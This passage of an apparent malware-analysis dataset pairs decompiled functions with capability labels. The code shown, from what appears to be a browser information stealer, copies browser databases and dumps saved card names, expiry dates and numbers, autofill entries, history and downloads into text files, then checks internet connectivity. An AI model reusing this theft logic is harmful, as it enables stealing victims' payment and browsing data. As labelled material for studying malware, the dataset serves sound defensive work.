(**0x457520)(&var_114h, 0x44edec);\n                    (**0x457520)(&var_114h, 0x44edf0);\n                    (**0x457520)(&var_114h, 0x44c8cc);\n                    (**0x457520)(&var_114h);\n                    (**0x457520)(&var_114h, 0x44c8cc);\n                    if (unaff_ESI == 0) {\n                        puVar4 = &var_928h;\n                    }\n                    else {\n                        (**0x457520)(&var_114h, &var_928h);\n                        (**0x457520)(&var_114h, 0x44c8cc);\n                        puVar4 = in_ECX;\n                    }\n                    (**0x457520)(&var_114h, puVar4);\n                    if (unaff_EBX == NULL) {\n                        *0x457814 = 0x10000;\n                    }\n                    else if (*unaff_EBX == 2) {\n                        *0x457814 = fcn.0042bf30(&var_114h, 0, 2);\n                    }\n                    else {\n                        *0x457814 = 0x80000;\n                    }\n                }\n            }\n            iVar2 = (**0x457438)(iVar1, &var_954h);\n        } while (iVar2 != 0);\n        (**0x4573a8)(iVar1);\n    }\n    fcn.0042d636(arg_8h_00);\n    return;\n}\n",
        "token_count": 1122
    },
    "00415c30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00415c30(uint arg_8h, uint arg_ch, uint arg_10h, int32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint var_958h;\n    uint var_954h;\n    uint var_950h;\n    uint var_924h;\n    uint var_810h;\n    uint var_428h;\n    uint var_320h;\n    uint var_218h;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    fcn.00434d30(&var_810h, 0, 1000);\n    arg_8h_00 = 0x1a;\n    iVar1 = (**0x457500)(0, 0x1a, 0, 0, &var_810h);\n    (**0x457374)(&var_320h, 0x44edf4, (iVar1 < 0) - 1 & &var_810h, arg_8h);\n    iVar1 = (**0x4575e0)(&var_320h, &var_950h);\n    if (iVar1 != -1) {\n        do {\n            iVar2 = (**0x457550)(&var_924h, 0x44eba0);\n            if (iVar2 != 0) {\n                iVar2 = (**0x457550)(&var_924h, 0x44eba4);\n                if (iVar2 != 0) {\n                    (**0x457374)(&var_218h, \"%s\\\\%s\", arg_8h, &var_924h);\n                    fcn.00434d30(&var_810h, 0, 1000);\n                    iVar2 = (**0x457500)(0, 0x1a, 0, 0, &var_810h);\n                    (**0x457374)(&var_428h, \"%s\\\\%s\", (iVar2 < 0) - 1 & &var_810h, &var_218h);\n                    fcn.00434d30(&var_110h, 0, 0x104);\n                    (**0x457520)(&var_110h, 0x44c8cc);\n                    (**0x457520)(&var_110h, 0x44eddc);\n                    (**0x457520)(&var_110h, 0x44ede0);\n                    (**0x457520)(&var_110h, 0x44ede4);\n                    (**0x457520)(&var_110h, 0x44ede4);\n                    (**0x457520)(&var_110h, 0x44ede8);\n                    (**0x457520)(&var_110h, 0x44edec);\n                    (**0x457520)(&var_110h, 0x44edf0);\n                    (**0x457520)(&var_110h, arg_8h);\n                    (**0x457520)(&var_110h, 0x44c8cc);\n                    (**0x457520)(&var_110h, &var_924h);\n                    if (arg_14h == NULL) {\n                        *0x457814 = 0x10000;\n                    }\n                    else if (*arg_14h == 2) {\n                        *0x457814 = fcn.0042bf30(&var_110h, 0, 2);\n                    }\n                    else {\n                        *0x457814 = 0x80000;\n                    }\n                    if ((var_950h & 0x10) != 0) {\n                        fcn.00415c30(&var_218h, arg_ch, arg_10h, arg_14h);\n                    }\n                }\n            }\n            iVar2 = (**0x457438)(iVar1, &var_950h);\n        } while (iVar2 != 0);\n        (**0x4573a8)(iVar1);\n    }\n    fcn.0042d636(arg_8h_00);\n    return;\n}\n",
        "token_count": 935
    },
    "00417780": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00417780(uint arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint32_t arg_1ch, uint noname_6, \n            uint arg_24h, uint arg_28h, uint arg_2ch, int32_t arg_30h, uint arg_34h, uint arg_38h)\n\n{\n    uint arg_10h;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint extraout_ECX;\n    int32_t extraout_EDX;\n    int32_t *in_FS_OFFSET;\n    uint uStackY11840;\n    uint uStackY11836;\n    int32_t iStackY11832;\n    int32_t iStackY11828;\n    int32_t iStackY11824;\n    int32_t iStackY11820;\n    uint32_t uStackY11816;\n    uint uStackY11800;\n    uint32_t uStackY11796;\n    uint var_1a80h;\n    uint var_12b0h;\n    uint var_ec8h;\n    uint var_ae0h;\n    uint var_6f8h;\n    uint var_5f8h;\n    uint var_404h;\n    uint var_204h;\n    uint uStackY328;\n    int32_t iStackY324;\n    uint uStackY320;\n    uint *puStackY316;\n    uchar *puStackY312;\n    uint uStackY308;\n    int32_t iStackY304;\n    uint *puStackY300;\n    int32_t iStackY296;\n    uint *puVar5;\n    char *arg_8h_00;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x441923;\n    var_ch = *in_FS_OFFSET;\n    fcn.0043c480();\n    *in_FS_OFFSET = &fcn.00417780::var_ch;\n    iStackY11824 = arg_30h;\n    uStackY11836 = arg_34h;\n    var_4h = 0;\n    iStackY11828 = extraout_EDX;\n    fcn.00434d30();\n    fcn.00434d30();\n    fcn.00434d30();\n    (**0x45757c)();\n    arg_10h = (**0x457504)();\n    fcn.00434d30();\n    iStackY11832 = (**0x45745c)();\n    (**0x457350)();\n    arg_8h_00 = \"https://\";\n    uStackY11840 = 0x100;\n    iStackY11820 = 0;\n    iVar1 = (**0x457550)();\n    if (iVar1 == 0) {\n        iStackY11820 = 1;\n    }\n    if (iStackY11832 != 0) {\n        fcn.00423e60();\n        (**0x457520)();\n        (**0x457520)();\n        (**0x457520)();\n        (**0x457520)();\n        (**0x457520)();\n        (**0x457520)();\n        (**0x457520)();\n        (**0x457520)();\n        (**0x457520)();\n        (**0x457520)();\n        (**0x457520)();\n        (**0x457520)();\n        (**0x457520)();\n        (**0x457520)();\n        (**0x457520)();\n        if (iStackY11820 == 0) {\n            iStackY11820 = (**0x457578)();\n        }\n        else {\n            iStackY11820 = (**0x457578)();\n        }\n        if ((iStackY11820 != 0) && (iVar1 = (**0x4575bc)(),  iVar1 != 0)) {\n            fcn.00434d30();\n            (**0x457520)();\n            fcn.0040e6f0();\n            var_4h._0_1_ = 1;\n            (**0x457520)();\n            var_4h = var_4h._1_3_ << 8;\n            if (0xf < uStackY11796) {\n                fcn.0042d62b();\n            }\n            uStackY11796 = 0xf;\n            uStackY11800 = 0;\n            uStackY11816 = uStackY11816 & 0xffffff00;\n            (**0x457418)();\n            (**0x45738c)();\n            fcn.00434d30();\n            (**0x457520)();\n            (**0x457520)();\n            (**0x457418)();\n            (**0x45738c)();\n            fcn.00434d30();\n            (**0x457520)();\n            (**0x457520)();\n            (**0x457418)();\n            (**0x45738c)();\n            (**0x457520)();\n            (**0x457520)();\n            (**0x457520)();\n            (**0x457520)();\n            (**0x457520)();\n            (**0x457520)();\n            uStackY11836 = (**0x457418)();\n            (**0x457418)();\n            (**0x45757c)();\n            iStackY11824 = (**0x457504)();\n            uVar2 = (**0x457418)();\n            fcn.0042f700(iStackY11824, &fcn.00417780::var_404h, uVar2);\n            puVar5 = &fcn.00417780::var_404h;\n            uVar2 = extraout_ECX;\n            iVar3 = (**0x457418)();\n            fcn.0042f700(iVar3 + iStackY11824, puVar5, uVar2);\n            (**0x457418)();\n            puVar5 = &fcn.00417780::var_404h;\n            iVar3 = (**0x457418)();\n            iStackY296 = 0x417ce0;\n            fcn.0042f700(iVar3 + iStackY11828 + iStackY11824, puVar5, arg_10h);\n            iVar3 = 0;\n            do {\n                iStackY296 = 0x417cfa;\n                iStackY296 = (**0x457418)();\n                puStackY300 = &fcn.00417780::var_204h;\n                uStackY308 = 0x417d09;\n                iStackY304 = iVar1;\n                (**0x45753c)();\n                uStackY308 = 0;\n                puStackY312 = &stack0xffffd1c0;\n                puStackY316 = &fcn.00417780::var_6f8h;\n                uStackY320 = 0x13;\n                uStackY328 = 0x417d22;\n                iStackY324 = iVar1;\n                iVar4 = (**0x4575d4)();\n                if ((iVar4 != 0) && (iVar4 = (**0x457550)(),  iVar4 == 0)) break;\n                (**0x457390)();\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < 6);\n            puStackY300 = 0x417d67;\n            iStackY296 = iVar1;\n            iVar1 = (**0x457480)();\n            while ((iVar1 != 0 && (iStackY11828 != 0))) {\n                *(&fcn.00417780::var_1a80h + iStackY11828) = 0;\n                (**0x457520)();\n                iVar1 = (**0x457480)();\n            }\n        }\n    }\n    (**0x457458)();\n    (**0x457458)();\n    (**0x457458)();\n    if (0xf < arg_1ch) {\n        fcn.0042d62b();\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(arg_8h_00);\n    return;\n}\n",
        "token_count": 1789
    },
    "00418500": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418500(char *arg_8h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t extraout_ECX;\n    code *var_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h != '\\0') {\n        fcn.0042f5f6(0, 0);\n        in_ECX = extraout_ECX;\n    }\n    uVar2 = *(in_ECX + 0x10) & *(in_ECX + 0xc);\n    if ((uVar2 & 4) != 0) {\n        var_4h = fcn.0042cc73();\n        arg_8h = \"ios_base::badbit set\";\n        fcn.0042d7ec(&arg_8h);\n        var_8h = 1;\n        var_14h = vtable.std::ios_base::failure.0;\n        uVar2 = fcn.0042f5f6(&var_14h, 0x45117c);\n    }\n    if ((uVar2 & 2) != 0) {\n        uVar3 = fcn.0042cc73();\n        arg_8h = \"ios_base::failbit set\";\n        fcn.0042d7ec(&arg_8h);\n        var_8h = 1;\n        var_14h = vtable.std::ios_base::failure.0;\n        var_4h = uVar3;\n        fcn.0042f5f6(&var_14h, 0x45117c);\n    }\n    uVar3 = fcn.0042cc73();\n    arg_8h = \"ios_base::eofbit set\";\n    fcn.0042d7ec(&arg_8h);\n    var_8h = 1;\n    var_14h = vtable.std::ios_base::failure.0;\n    var_4h = uVar3;\n    fcn.0042f5f6(&var_14h, 0x45117c);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 496
    },
    "00419220": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419220(uint arg_8h, uint arg_ch, uint arg_10h, int32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    uint uVar3;\n    uint *puVar4;\n    uint uVar5;\n    uint *puVar6;\n    uint uVar7;\n    uint in_EDX;\n    uint unaff_ESI;\n    int32_t *in_FS_OFFSET;\n    uint extraout_var;\n    uint uVar8;\n    uint var_260h;\n    uint var_25ch;\n    uint var_258h;\n    uint var_254h;\n    uint var_250h;\n    uint var_24ch;\n    uint var_248h;\n    uint *var_244h;\n    uint var_240h;\n    uint32_t var_23ch;\n    uint var_22ch;\n    uint32_t var_228h;\n    uint var_220h;\n    uint var_118h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4429ab;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_248h = arg_8h;\n    iVar1 = (**0x457550)(arg_10h, *0x456e0c, var_10h);\n    if (iVar1 == 0) {\n        arg_ch = 0x44c726;\n    }\n    else {\n        iVar1 = (**0x457550)(arg_10h, *0x456e34);\n        if (iVar1 == 0) {\n            arg_ch = 0x44c726;\n        }\n        else {\n            iVar1 = (**0x457550)(arg_ch, *0x457110);\n            if (iVar1 == 0) goto code_r0x0041970a;\n        }\n    }\n    fcn.00434d30(&var_220h, 0, 0x104);\n    (**0x457520)(&var_220h, *0x457098);\n    puVar2 = fcn.0042d6d0(0x1a);\n    *puVar2 = 0;\n    uVar3 = (**0x45758c)();\n    fcn.0042f3d4(uVar3);\n    var_244h = 0x1a;\n    do {\n        iVar1 = fcn.0042f3e6();\n        (**0x457374)(puVar2, 0x44fa74, puVar2, iVar1 % 10);\n        var_244h = var_244h + -1;\n    } while (var_244h != NULL);\n    puVar2[0x1a] = 0;\n    (**0x457520)(&var_220h, puVar2);\n    (**0x4573c8)(var_248h, &var_220h, 1);\n    fcn.00434d30(&var_118h, 0, 0x104);\n    (**0x457520)(&var_118h, 0x44c8cc);\n    (**0x457520)(&var_118h, *0x457104);\n    (**0x457520)(&var_118h, 0x44c8cc);\n    (**0x457520)(&var_118h, arg_10h);\n    (**0x457520)(&var_118h, 0x44efd8);\n    (**0x457520)(&var_118h, arg_ch);\n    (**0x457520)(&var_118h, \".txt\");\n    uVar3 = *0x456d94;\n    iVar1 = (**0x457344)(&var_220h, &var_24ch);\n    if (iVar1 == 0) {\n        iVar1 = (**0x4572f8)(var_24ch, uVar3, 0xffffffff, &var_240h, 0);\n        if (iVar1 == 0) {\n            uVar3 = (**0x45757c)(0, 999999);\n            uVar3 = (**0x457504)(uVar3);\n            iVar1 = (**0x457314)(var_240h);\n            while (iVar1 == 100) {\n                var_248h = (**0x457334)(var_240h, 0);\n                puVar4 = (**0x457334)(var_240h, 1);\n                uVar5 = (**0x457334)(var_240h, 2);\n                puVar6 = (**0x457334)(var_240h, 3);\n                var_244h = (**0x457334)(var_240h, 4);\n                uVar7 = (**0x457334)(var_240h, 5);\n                iVar1 = (**0x457550)(puVar4, 0x44efdc);\n                *puVar4 = 0;\n                uVar8 = *0x45720c;\n                if (iVar1 == 0) {\n                    uVar8 = *0x456dec;\n                }\n                (**0x457520)(puVar4, uVar8);\n                iVar1 = (**0x457550)(puVar6, 0x44efdc);\n                *puVar6 = 0;\n                uVar8 = *0x45720c;\n                if (iVar1 == 0) {\n                    uVar8 = *0x456dec;\n                }\n                (**0x457520)(puVar6, uVar8);\n                if (*var_244h == '-') {\n                    *var_244h = 0;\n                    (**0x457520)(var_244h, 0x44efdc);\n                }\n                (**0x457520)(uVar3, var_248h);\n                (**0x457520)(uVar3, 0x44efe0);\n                (**0x457520)(uVar3, puVar4);\n                (**0x457520)(uVar3, 0x44efe0);\n                (**0x457520)(uVar3, uVar5);\n                (**0x457520)(uVar3, 0x44efe0);\n                (**0x457520)(uVar3, puVar6);\n                (**0x457520)(uVar3, 0x44efe0);\n                (**0x457520)(uVar3, var_244h);\n                (**0x457520)(uVar3, 0x44efe0);\n                (**0x457520)(uVar3, uVar7);\n                (**0x457520)(uVar3, 0x44efe0);\n                uVar5 = in_EDX;\n                (**0x457320)(var_240h, 6);\n                uVar8 = extraout_var;\n                (**0x457328)(var_240h, 6);\n                puVar4 = fcn.00418cb0(uVar8, uVar5);\n                var_4h = 0;\n                if (0xf < puVar4[5]) {\n                    puVar4 = *puVar4;\n                }\n                (**0x457520)(uVar3, puVar4);\n                var_4h = 0xffffffff;\n                if (0xf < var_228h) {\n                    fcn.0042d62b(var_23ch);\n                }\n                var_228h = 0xf;\n                var_22ch = 0;\n                var_23ch = var_23ch & 0xffffff00;\n                (**0x457520)(uVar3, 0x44c738);\n                iVar1 = (**0x457314)(var_240h);\n            }\n            uVar3 = (**0x457418)(uVar3);\n            if (arg_14h == NULL) {\n                *0x457814 = 0x10000;\n            }\n            else if (*arg_14h == 2) {\n                *0x457814 = fcn.0042bf30(&var_118h, uVar3, 3);\n            }\n            else {\n                *0x457814 = 0x80000;\n            }\n        }\n        (**0x457318)(var_240h);\n        (**0x457348)(var_24ch);\n    }\n    (**0x457424)(&var_220h);\ncode_r0x0041970a:\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(unaff_ESI);\n    return;\n}\n",
        "token_count": 1913
    },
    "00419730": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419730(uint arg_8h, uint arg_ch, uint arg_10h, int32_t *arg_14h)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    uint *puVar6;\n    uint in_EDX;\n    int32_t iVar7;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    uint var_258h;\n    uint var_254h;\n    uint var_250h;\n    uint var_24ch;\n    uint var_248h;\n    uint var_244h;\n    uint var_240h;\n    uint32_t var_23ch;\n    uint var_22ch;\n    uint32_t var_228h;\n    uint var_220h;\n    uint var_118h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x44296b;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00434d30(&var_118h, 0, 0x104, var_10h);\n    (**0x457520)(&var_118h, *0x457098);\n    puVar1 = fcn.0042d6d0(0x1a);\n    *puVar1 = 0;\n    uVar2 = (**0x45758c)();\n    fcn.0042f3d4(uVar2);\n    iVar7 = 0x1a;\n    do {\n        iVar3 = fcn.0042f3e6();\n        (**0x457374)(puVar1, 0x44fa74, puVar1, iVar3 % 10);\n        iVar7 = iVar7 + -1;\n    } while (iVar7 != 0);\n    arg_8h_00 = &var_118h;\n    puVar1[0x1a] = 0;\n    (**0x457520)(arg_8h_00, puVar1);\n    (**0x4573c8)(arg_8h, &var_118h, 1);\n    fcn.00434d30(&var_220h, 0, 0x104);\n    (**0x457374)(&var_220h, 0x44efe4, var_244h, arg_ch);\n    uVar2 = *0x456c30;\n    iVar7 = (**0x457344)(&var_118h, &var_248h);\n    if (iVar7 == 0) {\n        iVar7 = (**0x4572f8)(var_248h, uVar2, 0xffffffff, &var_240h, 0);\n        if (iVar7 == 0) {\n            uVar2 = (**0x45757c)(0, 999999);\n            uVar2 = (**0x457504)(uVar2);\n            iVar7 = (**0x457314)(var_240h);\n            while (iVar7 == 100) {\n                uVar4 = (**0x457334)(var_240h, 0);\n                uVar5 = (**0x457334)(var_240h, 1);\n                var_244h = (**0x457334)(var_240h, 2);\n                (**0x457520)(uVar2, \"Name: \");\n                (**0x457520)(uVar2, uVar4);\n                (**0x457520)(uVar2, 0x44c738);\n                (**0x457520)(uVar2, \"Month: \");\n                (**0x457520)(uVar2, uVar5);\n                (**0x457520)(uVar2, 0x44c738);\n                (**0x457520)(uVar2, \"Year: \");\n                (**0x457520)(uVar2, var_244h);\n                (**0x457520)(uVar2, 0x44c738);\n                (**0x457520)(uVar2, \"Card: \");\n                uVar4 = in_EDX;\n                uVar5 = arg_10h;\n                (**0x457320)(var_240h, 3);\n                (**0x457328)(var_240h, 3);\n                puVar6 = fcn.00418cb0(uVar4, uVar5);\n                var_4h = 0;\n                if (0xf < puVar6[5]) {\n                    puVar6 = *puVar6;\n                }\n                (**0x457520)(uVar2, puVar6);\n                var_4h = 0xffffffff;\n                if (0xf < var_228h) {\n                    fcn.0042d62b(var_23ch);\n                }\n                var_228h = 0xf;\n                var_22ch = 0;\n                var_23ch = var_23ch & 0xffffff00;\n                (**0x457520)(uVar2, 0x44ed2c);\n                iVar7 = (**0x457314)(var_240h);\n            }\n            uVar2 = (**0x457418)(uVar2);\n            if (arg_14h == NULL) {\n                *0x457814 = 0x10000;\n            }\n            else if (*arg_14h == 2) {\n                *0x457814 = fcn.0042bf30(&var_220h, uVar2, 3);\n            }\n            else {\n                *0x457814 = 0x80000;\n            }\n        }\n        (**0x457318)(var_240h);\n        (**0x457348)(var_248h);\n    }\n    (**0x457424)(&var_118h);\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(arg_8h_00);\n    return;\n}\n",
        "token_count": 1340
    },
    "00419ac0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419ac0(uint arg_8h)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar5;\n    uint *arg_8h_00;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    fcn.00434d30(&var_110h, 0, 0x104);\n    (**0x457520)(&var_110h, *0x457098);\n    puVar1 = fcn.0042d6d0(0x1a);\n    *puVar1 = 0;\n    uVar2 = (**0x45758c)();\n    fcn.0042f3d4(uVar2);\n    iVar5 = 0x1a;\n    do {\n        iVar3 = fcn.0042f3e6();\n        (**0x457374)(puVar1, 0x44fa74, puVar1, iVar3 % 10);\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    puVar1[0x1a] = 0;\n    (**0x457520)(&var_110h, puVar1);\n    arg_8h_00 = &var_110h;\n    (**0x4573c8)();\n    fcn.00434d30(&var_218h, 0, 0x104);\n    (**0x457374)(&var_218h, \"\\\\Autofill\\\\%s_%s.txt\", in_ECX, arg_8h);\n    uVar2 = *0x4571c4;\n    iVar5 = (**0x457344)(&var_110h, &var_220h);\n    if (iVar5 == 0) {\n        iVar5 = (**0x4572f8)(var_220h, uVar2, 0xffffffff, &var_21ch, 0);\n        if (iVar5 == 0) {\n            uVar2 = (**0x45757c)(0, 999999);\n            uVar2 = (**0x457504)(uVar2);\n            iVar5 = (**0x457314)(var_21ch);\n            while (iVar5 == 100) {\n                uVar4 = (**0x457334)(var_21ch, 0);\n                (**0x457520)(uVar2, uVar4);\n                (**0x457520)(uVar2, 0x44f028);\n                uVar4 = (**0x457334)(var_21ch, 1);\n                (**0x457520)(uVar2, uVar4);\n                (**0x457520)(uVar2, 0x44c738);\n                iVar5 = (**0x457314)(var_21ch);\n            }\n            uVar2 = (**0x457418)(uVar2);\n            if (in_EDX == NULL) {\n                *0x457814 = 0x10000;\n            }\n            else if (*in_EDX == 2) {\n                *0x457814 = fcn.0042bf30(&var_218h, uVar2, 3);\n            }\n            else {\n                *0x457814 = 0x80000;\n            }\n        }\n        (**0x457318)(var_21ch);\n        (**0x457348)(var_220h);\n    }\n    (**0x457424)(&var_110h);\n    fcn.0042d636(arg_8h_00);\n    return;\n}\n",
        "token_count": 860
    },
    "00419d10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419d10(uint arg_8h)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar5;\n    uint *arg_8h_00;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    fcn.00434d30(&var_110h, 0, 0x104);\n    (**0x457520)(&var_110h, *0x457098);\n    puVar1 = fcn.0042d6d0(0x1a);\n    *puVar1 = 0;\n    uVar2 = (**0x45758c)();\n    fcn.0042f3d4(uVar2);\n    iVar5 = 0x1a;\n    do {\n        iVar3 = fcn.0042f3e6();\n        (**0x457374)(puVar1, 0x44fa74, puVar1, iVar3 % 10);\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    puVar1[0x1a] = 0;\n    (**0x457520)(&var_110h, puVar1);\n    arg_8h_00 = &var_110h;\n    (**0x4573c8)();\n    fcn.00434d30(&var_218h, 0, 0x104);\n    (**0x457374)(&var_218h, \"\\\\History\\\\%s_%s.txt\", in_ECX, arg_8h);\n    iVar5 = (**0x457344)(&var_110h, &var_220h);\n    if (iVar5 == 0) {\n        iVar5 = (**0x4572f8)(var_220h, *0x456ec0, 0xffffffff, &var_21ch, 0);\n        if (iVar5 == 0) {\n            uVar2 = (**0x45757c)(0, 999999);\n            uVar2 = (**0x457504)(uVar2);\n            iVar5 = (**0x457314)(var_21ch);\n            while (iVar5 == 100) {\n                (**0x457334)(var_21ch, 0);\n                uVar4 = (**0x457334)(var_21ch, 0);\n                (**0x457520)(uVar2, uVar4);\n                (**0x457520)(uVar2, 0x44c738);\n                iVar5 = (**0x457314)(var_21ch);\n            }\n            uVar2 = (**0x457418)(uVar2);\n            if (in_EDX == NULL) {\n                *0x457814 = 0x10000;\n            }\n            else if (*in_EDX == 2) {\n                *0x457814 = fcn.0042bf30(&var_218h, uVar2, 3);\n            }\n            else {\n                *0x457814 = 0x80000;\n            }\n        }\n        (**0x457318)(var_21ch);\n        (**0x457348)(var_220h);\n    }\n    (**0x457424)(&var_110h);\n    fcn.0042d636(arg_8h_00);\n    return;\n}\n",
        "token_count": 811
    },
    "00419f60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419f60(uint arg_8h, uint arg_ch)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar7;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    fcn.00434d30(&var_110h, 0, 0x104);\n    (**0x457520)(&var_110h, *0x457098);\n    puVar1 = fcn.0042d6d0(0x1a);\n    *puVar1 = 0;\n    uVar2 = (**0x45758c)();\n    fcn.0042f3d4(uVar2);\n    iVar7 = 0x1a;\n    do {\n        iVar3 = fcn.0042f3e6();\n        (**0x457374)(puVar1, 0x44fa74, puVar1, iVar3 % 10);\n        iVar7 = iVar7 + -1;\n    } while (iVar7 != 0);\n    puVar1[0x1a] = 0;\n    (**0x457520)(&var_110h, puVar1);\n    uVar2 = 1;\n    (**0x4573c8)(arg_8h, &var_110h);\n    fcn.00434d30(&var_218h, 0, 0x104);\n    (**0x457374)(&var_218h, \"\\\\Downloads\\\\%s_%s.txt\", in_ECX, arg_ch);\n    uVar4 = *0x457280;\n    iVar7 = (**0x457344)(&var_110h, &var_220h);\n    if (iVar7 == 0) {\n        iVar7 = (**0x4572f8)(var_220h, uVar4, 0xffffffff, &var_21ch, 0);\n        if (iVar7 == 0) {\n            uVar4 = (**0x45757c)(0, 999999);\n            uVar4 = (**0x457504)(uVar4);\n            iVar7 = (**0x457314)(var_21ch);\n            while (iVar7 == 100) {\n                uVar5 = (**0x457334)(var_21ch, 0);\n                uVar6 = (**0x457334)(var_21ch, 1);\n                (**0x457520)(uVar4, uVar5);\n                (**0x457520)(uVar4, 0x44c738);\n                (**0x457520)(uVar4, uVar6);\n                (**0x457520)(uVar4, 0x44ed2c);\n                iVar7 = (**0x457314)(var_21ch);\n            }\n            uVar4 = (**0x457418)(uVar4);\n            if (in_EDX == NULL) {\n                *0x457814 = 0x10000;\n            }\n            else if (*in_EDX == 2) {\n                *0x457814 = fcn.0042bf30(&var_218h, uVar4, 3);\n            }\n            else {\n                *0x457814 = 0x80000;\n            }\n        }\n        (**0x457318)(var_21ch);\n        (**0x457348)(var_220h);\n    }\n    (**0x457424)(&var_110h);\n    fcn.0042d636(uVar2);\n    return;\n}\n",
        "token_count": 863
    },
    "0041a450": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
